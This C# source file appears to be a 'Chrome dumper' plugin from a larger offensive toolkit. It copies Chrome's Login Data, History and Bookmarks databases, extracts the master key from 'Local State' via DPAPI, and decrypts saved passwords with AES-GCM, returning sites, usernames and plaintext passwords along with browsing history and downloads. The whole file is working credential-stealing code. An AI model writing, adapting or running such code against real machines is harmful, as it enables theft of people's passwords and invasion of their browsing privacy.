using System;
using System.Collections.Generic;
using System.Data;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

using System.Security.Cryptography;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Parameters;
using System.Security.Principal;
using Org.BouncyCastle.Crypto.Generators;
using System.Runtime.InteropServices;
using Newtonsoft.Json;
using System.Data.SQLite;
using System.Text.RegularExpressions;
using Org.BouncyCastle.Cms;
using Newtonsoft.Json.Linq;

namespace Plugin48Dumper
{
    public class clsChromeDumper : clsDumper
    {
        private string LocalApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
        private string ApplicationData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

        private string UserDataFile { get { return Path.Combine(LocalApplicationData, "Google", "Chrome", "User Data"); } }
        private string DefaultDir { get { return Path.Combine(UserDataFile, "Default"); } }

        private string BookMarkFile { get { return Path.Combine(DefaultDir, "Bookmarks"); } }
        private string HistoryFile { get { return Path.Combine(DefaultDir, "History"); } }
        private string LoginFile { get { return Path.Combine(DefaultDir, "Login Data"); } }
        private string LocalStateFile { get { return Path.Combine(UserDataFile, "Local State"); } }
        private string WebDataFile { get { return Path.Combine(DefaultDir, "Web Data"); } }

        public Dictionary<string, string> m_dicModule = new Dictionary<string, string>()
        {
            {
                "history",
                "Extract Chrome stored history records."
            },
        };

        public clsChromeDumper()
        {
            Description = "Chrome dumper.";
            Usage = "foo";
            Entry = "chrome";

            Available = true;
        }

        public class clsCredential
        {
            public string URL;
            public string Username;
            public string Password;
            public string szCreationDate;
            public string szLastUsed;
        }

        public class clsHistory
        {
            public string Title;
            public string URL;
            public string szLastUsed;
        }

        public class clsDownload
        {
            public string FileName;
            public string TargetPath;
            public string URL;
            public long Length;
            public string szDate;
        }

        public class clsBookmark
        {
            public string Name;
            public string URL;
            public string Path;

            public string szAddDate;
            public string szLastUsed;
        }

        public class clsCreditCard
        {
            
        }

        public List<clsCredential> fnlsDumpCredential(int nCount = 100, string szRegex = "")
        {
            List<clsCredential> ls = new List<clsCredential>();

            string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            File.Copy(LoginFile, dst);

            string szConnStr = fnConnString(dst);
            using (var conn = new SQLiteConnection(szConnStr))
            {
                conn.Open();
                using (var cmd = new SQLiteCommand(conn))
                {
                    string szQuery = $"SELECT " +
                        $"CAST(origin_url AS TEXT) AS origin_url, " +
                        $"CAST(username_value AS TEXT) AS username_value, " +
                        $"password_value, " +
                        $"date_created, " +
                        $"date_last_used " +
                        $"FROM logins ORDER BY date_last_used DESC";

                    if (nCount > -1)
                        szQuery += $" LIMIT {nCount}";

                    cmd.CommandText = szQuery;

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string szOriginalUrl = (string)reader["origin_url"];
                            string szUsername = (string)reader["username_value"];
                            byte[] abPassword = (byte[])reader["password_value"];
                            long nDateCreated = (long)reader["date_created"];
                            long nDateLastUsed = (long)reader["date_last_used"];

                            DateTime? dtCreated = fnChromeTimeToDateTime(nDateCreated);
                            DateTime? dtLastUsed = fnChromeTimeToDateTime(nDateLastUsed);

                            string szCreated = dtCreated == null ? "N/A" : dtCreated?.ToString("F");
                            string szLastUsed = dtLastUsed == null ? "N/A" : dtLastUsed?.ToString("F");

                            string szPassword = string.Empty;
                            if (fnbIsV10(abPassword))
                            {
                                LocalState localState = new LocalState(LocalStateFile);

                                byte[] nonce, ciphertextTag;
                                fnPrepare(abPassword, out nonce, out ciphertextTag);
                                szPassword = fnszDecrypt(ciphertextTag, localState.Key, nonce);
                            }
                            else
                            {
                                try
                                {
                                    szPassword = Encoding.UTF8.GetString(ProtectedData.Unprotect(abPassword, null, DataProtectionScope.CurrentUser));
                                }
                                catch (Exception ex)
                                {
                                    szPassword = "ERROR://" + ex.Message;
                                }
                            }

                            if (Regex.IsMatch(szOriginalUrl, szRegex) ||
                                Regex.IsMatch(szUsername, szRegex) ||
                                Regex.IsMatch(szPassword, szRegex) ||
                                Regex.IsMatch(szConnStr, szRegex) ||
                                Regex.IsMatch(szLastUsed, szRegex)
                            )
                            {
                                ls.Add(new clsCredential()
                                {
                                    URL = szOriginalUrl,
                                    Username = szUsername,
                                    Password = szPassword,
                                    szCreationDate = dtCreated == null ? "N/A" : dtCreated?.ToString("F"),
                                    szLastUsed = dtLastUsed == null ? "N/A" : dtLastUsed?.ToString("F"),
                                });
                            }
                        }
                    }
                }
            }

            File.Delete(dst);

            return ls;
        }

        public List<clsHistory> fnlsDumpHistory(int nCount = 100, string szRegex = "")
        {
            List<clsHistory> ls = new List<clsHistory>();

            string dst = Path.Combine(Path.GetTempPath(), Guid.NewGuid().ToString());
            File.Copy(HistoryFile, dst, true);

            string szConnString = fnConnString(dst);
            using (var conn = new SQLiteConnection(szConnString))
            {
                conn.Open();
                using (var cmd = new SQLiteCommand(conn))
                {
                    string szQuery = @"
                        SELECT 
                            CAST(url AS TEXT) AS url,
                            CAST(title AS TEXT) AS title,
                            last_visit_time
                        FROM urls
                        ORDER BY last_visit_time DESC";

                    if (nCount > -1)
                        szQuery += $" LIMIT {nCount}";

                    cmd.CommandText = szQuery;

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string title = reader["title"]?.ToString();
                            string url = reader["url"]?.ToString();

                            long time = 0;
                            if (reader["last_visit_time"] != DBNull.Value)
                                long.TryParse(reader["last_visit_time"].ToString(), out time);

                            DateTime? dt = fnChromeTimeToDateTime(time);
                            string szLastUsed = dt == null ? "N/A" : dt?.ToString("F");

                            if (Regex.IsMatch(title, szRegex) ||
                                Regex.IsMatch(url, szRegex) ||
                                Regex.IsMatch(szLastUsed, szRegex)
                            )
                            {
                                ls.Add(new clsHistory()
                                {
                                    Title = title,
                                    URL = url,
                                    szLastUsed = szLastUsed,
                                });
                            }
                        }
                    }
                }
            }

            File.Delete(dst);

            return ls;
        }

        public List<clsDownload> fnlsDumpDownload(int nCount = 100, string szRegex = "")
        {
            List<clsDownload> ls = new List<clsDownload>();

            string szDst = fnNewTempFilePath();
            File.Copy(HistoryFile, szDst);

            string szConnStr = fnConnString(szDst);
            using (var conn = new SQLiteConnection(szConnStr))
            {
                conn.Open();

                using (var cmd = new SQLiteCommand(conn))
                {
                    string szQuery = $"SELECT " +
                        $"CAST(target_path AS TEXT) AS target_path, " +
                        $"total_bytes, " +
                        $"CAST(tab_url AS TEXT) AS tab_url, " +
                        $"end_time " +
                        $"FROM downloads ORDER BY end_time DESC";
                    if (nCount != -1)
                        szQuery += $" LIMIT {nCount}";

                    cmd.CommandText = szQuery;

                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            string szTargetPath = reader["target_path"]?.ToString();
                            long nTotalBytes = long.Parse(reader["total_bytes"]?.ToString());
                            string szURL = reader["tab_url"]?.ToString();
                            long nEndTime = long.Parse(reader["end_time"]?.ToString());
                            
                            DateTime? dt = fnChromeTimeToDateTime(nEndTime);
                            string szData = dt == null ? "N/A" : dt?.ToString("F");

                            if (Regex.IsMatch(szTargetPath, szRegex) || 
                                Regex.IsMatch(nTotalBytes.ToString(), szRegex) ||
                                Regex.IsMatch(szURL, szRegex) ||
                                Regex.IsMatch(szData, szRegex)
                            )
                            {
                                ls.Add(new clsDownload()
                                {
                                    TargetPath = szTargetPath,
                                    Length = nTotalBytes,
                                    URL = szURL,
                                    szDate = szData,
                                });
                            }
                        }
                    }
                }
            }

            File.Delete(szDst);

            return ls;
        }

        public List<clsBookmark> fnlsBookmark(int nCount = 100)
        {
            List<clsBookmark> ls = new List<clsBookmark>();

            string szContent = File.ReadAllText(BookMarkFile);
            
            var root = JObject.Parse(szContent);
            var roots = root["roots"];
            if (roots == null)
                return ls;

            foreach (var r in roots.Children<JProperty>())
            {
                var node = r.Value;
                fnParseNode(node, r.Name, ls);
            }

            return ls;
        }

        private bool fnbIsV10(byte[] data)
        {
            if (Encoding.UTF8.GetString(data.Take(3).ToArray()) == "v10")
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        private void fnPrepare(byte[] encryptedData, out byte[] nonce, out byte[] ciphertextTag)
        {
            nonce = new byte[12];
            ciphertextTag = new byte[encryptedData.Length - 3 - nonce.Length];

            Array.Copy(encryptedData, 3, nonce, 0, nonce.Length);
            Array.Copy(encryptedData, 3 + nonce.Length, ciphertextTag, 0, ciphertextTag.Length);
        }

        private string fnszDecrypt(byte[] encryptedBytes, byte[] key, byte[] iv)
        {
            string sR = string.Empty;
            try
            {
                GcmBlockCipher cipher = new GcmBlockCipher(new AesEngine());
                AeadParameters parameters = new AeadParameters(new KeyParameter(key), 128, iv, null);

                cipher.Init(false, parameters);
                byte[] plainBytes = new byte[cipher.GetOutputSize(encryptedBytes.Length)];
                Int32 retLen = cipher.ProcessBytes(encryptedBytes, 0, encryptedBytes.Length, plainBytes, 0);
                cipher.DoFinal(plainBytes, retLen);

                sR = Encoding.UTF8.GetString(plainBytes).TrimEnd("\r\n\0".ToCharArray());
            }
            catch
            {
                return "Decryption failed :(";
            }

            return sR;
        }

        public List<clsBookmark> fnlsDumpBookMark(int nCount = 100)
        {
            List<clsBookmark> ls = new List<clsBookmark>();


            return ls;
        }

        private void fnParseNode(JToken node, string szCurrentPath, List<clsBookmark> output)
        {
            var type = node["type"]?.ToString();

            if (type == "url")
            {
                output.Add(new clsBookmark()
                {
                    Name = node["name"]?.ToString(),
                    URL = node["url"]?.ToString(),
                    Path = szCurrentPath,

                    szAddDate = fnChromeTimeToDateTime(long.Parse(node["date_added"]?.ToString()))?.ToString("F"),
                    szLastUsed = fnChromeTimeToDateTime(long.Parse(node["date_last_used"]?.ToString()))?.ToString("F"),
                });

                return;
            }

            var children = node["children"];
            if (children == null)
                return;

            foreach (var child in children)
            {
                var name = child["name"]?.ToString();
                var nextPath = string.IsNullOrEmpty(name) ? szCurrentPath : $"{szCurrentPath}/{name}";

                fnParseNode(child, nextPath, output);
            }
        }

        public class BCrypt
        {
            public const uint ERROR_SUCCESS = 0x00000000;
            public const uint BCRYPT_PAD_PSS = 8;
            public const uint BCRYPT_PAD_OAEP = 4;

            public static readonly byte[] BCRYPT_KEY_DATA_BLOB_MAGIC = BitConverter.GetBytes(0x4d42444b);

            public static readonly string BCRYPT_OBJECT_LENGTH = "ObjectLength";
            public static readonly string BCRYPT_CHAIN_MODE_GCM = "ChainingModeGCM";
            public static readonly string BCRYPT_AUTH_TAG_LENGTH = "AuthTagLength";
            public static readonly string BCRYPT_CHAINING_MODE = "ChainingMode";
            public static readonly string BCRYPT_KEY_DATA_BLOB = "KeyDataBlob";
            public static readonly string BCRYPT_AES_ALGORITHM = "AES";

            public static readonly string MS_PRIMITIVE_PROVIDER = "Microsoft Primitive Provider";

            public static readonly int BCRYPT_AUTH_MODE_CHAIN_CALLS_FLAG = 0x00000001;
            public static readonly int BCRYPT_INIT_AUTH_MODE_INFO_VERSION = 0x00000001;

            public static readonly uint STATUS_AUTH_TAG_MISMATCH = 0xC000A002;

            [StructLayout(LayoutKind.Sequential)]
            public struct BCRYPT_PSS_PADDING_INFO
            {
                public BCRYPT_PSS_PADDING_INFO(string pszAlgId, int cbSalt)
                {
                    this.pszAlgId = pszAlgId;
                    this.cbSalt = cbSalt;
                }

                [MarshalAs(UnmanagedType.LPWStr)]
                public string pszAlgId;
                public int cbSalt;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO : IDisposable
            {
                public int cbSize;
                public int dwInfoVersion;
                public IntPtr pbNonce;
                public int cbNonce;
                public IntPtr pbAuthData;
                public int cbAuthData;
                public IntPtr pbTag;
                public int cbTag;
                public IntPtr pbMacContext;
                public int cbMacContext;
                public int cbAAD;
                public long cbData;
                public int dwFlags;

                public BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO(byte[] iv, byte[] aad, byte[] tag) : this()
                {
                    dwInfoVersion = BCRYPT_INIT_AUTH_MODE_INFO_VERSION;
                    cbSize = Marshal.SizeOf(typeof(BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO));

                    if (iv != null)
                    {
                        cbNonce = iv.Length;
                        pbNonce = Marshal.AllocHGlobal(cbNonce);
                        Marshal.Copy(iv, 0, pbNonce, cbNonce);
                    }

                    if (aad != null)
                    {
                        cbAuthData = aad.Length;
                        pbAuthData = Marshal.AllocHGlobal(cbAuthData);
                        Marshal.Copy(aad, 0, pbAuthData, cbAuthData);
                    }

                    if (tag != null)
                    {
                        cbTag = tag.Length;
                        pbTag = Marshal.AllocHGlobal(cbTag);
                        Marshal.Copy(tag, 0, pbTag, cbTag);

                        cbMacContext = tag.Length;
                        pbMacContext = Marshal.AllocHGlobal(cbMacContext);
                    }
                }

                public void Dispose()
                {
                    if (pbNonce != IntPtr.Zero) Marshal.FreeHGlobal(pbNonce);
                    if (pbTag != IntPtr.Zero) Marshal.FreeHGlobal(pbTag);
                    if (pbAuthData != IntPtr.Zero) Marshal.FreeHGlobal(pbAuthData);
                    if (pbMacContext != IntPtr.Zero) Marshal.FreeHGlobal(pbMacContext);
                }
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct BCRYPT_KEY_LENGTHS_STRUCT
            {
                public int dwMinLength;
                public int dwMaxLength;
                public int dwIncrement;
            }

            [StructLayout(LayoutKind.Sequential)]
            public struct BCRYPT_OAEP_PADDING_INFO
            {
                public BCRYPT_OAEP_PADDING_INFO(string alg)
                {
                    pszAlgId = alg;
                    pbLabel = IntPtr.Zero;
                    cbLabel = 0;
                }

                [MarshalAs(UnmanagedType.LPWStr)]
                public string pszAlgId;
                public IntPtr pbLabel;
                public int cbLabel;
            }

            [DllImport("bcrypt.dll")]
            public static extern uint BCryptOpenAlgorithmProvider(out IntPtr phAlgorithm,
                                                                  [MarshalAs(UnmanagedType.LPWStr)] string pszAlgId,
                                                                  [MarshalAs(UnmanagedType.LPWStr)] string pszImplementation,
                                                                  uint dwFlags);

            [DllImport("bcrypt.dll")]
            public static extern uint BCryptCloseAlgorithmProvider(IntPtr hAlgorithm, uint flags);

            [DllImport("bcrypt.dll", EntryPoint = "BCryptGetProperty")]
            public static extern uint BCryptGetProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbOutput, int cbOutput, ref int pcbResult, uint flags);

            [DllImport("bcrypt.dll", EntryPoint = "BCryptSetProperty")]
            internal static extern uint BCryptSetAlgorithmProperty(IntPtr hObject, [MarshalAs(UnmanagedType.LPWStr)] string pszProperty, byte[] pbInput, int cbInput, int dwFlags);


            [DllImport("bcrypt.dll")]
            public static extern uint BCryptImportKey(IntPtr hAlgorithm,
                                                             IntPtr hImportKey,
                                                             [MarshalAs(UnmanagedType.LPWStr)] string pszBlobType,
                                                             out IntPtr phKey,
                                                             IntPtr pbKeyObject,
                                                             int cbKeyObject,
                                                             byte[] pbInput, //blob of type BCRYPT_KEY_DATA_BLOB + raw key data = (dwMagic (4 bytes) | uint dwVersion (4 bytes) | cbKeyData (4 bytes) | data)
                                                             int cbInput,
                                                             uint dwFlags);

            [DllImport("bcrypt.dll")]
            public static extern uint BCryptDestroyKey(IntPtr hKey);

            [DllImport("bcrypt.dll")]
            public static extern uint BCryptEncrypt(IntPtr hKey,
                                                    byte[] pbInput,
                                                    int cbInput,
                                                    ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
                                                    byte[] pbIV, int cbIV,
                                                    byte[] pbOutput,
                                                    int cbOutput,
                                                    ref int pcbResult,
                                                    uint dwFlags);

            [DllImport("bcrypt.dll")]
            internal static extern uint BCryptDecrypt(IntPtr hKey,
                                                      byte[] pbInput,
                                                      int cbInput,
                                                      ref BCRYPT_AUTHENTICATED_CIPHER_MODE_INFO pPaddingInfo,
                                                      byte[] pbIV,
                                                      int cbIV,
                                                      byte[] pbOutput,
                                                      int cbOutput,
                                                      ref int pcbResult,
                                                      int dwFlags);
        }
        public class LocalState
        {
            private readonly string Path;
            private string EncryptedKey;
            public byte[] Key { get; private set; }

            public LocalState(string path) { this.Path = path; DecryptKey(); }


            private void DecryptKey()
            {
                FindPlainKey();

                byte[] decodedKey = Convert.FromBase64String(EncryptedKey);
                byte[] encryptedKey = decodedKey.Skip(5).ToArray();
                this.Key = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
            }


            private void FindPlainKey()
            {
                using (StreamReader file = File.OpenText(Path))
                {
                    string localState = file.ReadToEnd();
                    dynamic dyJson = JsonConvert.DeserializeObject(localState);
                    string szKey = dyJson.os_crypt.encrypted_key;

                    EncryptedKey = szKey;
                }
            }
        }
    }
}
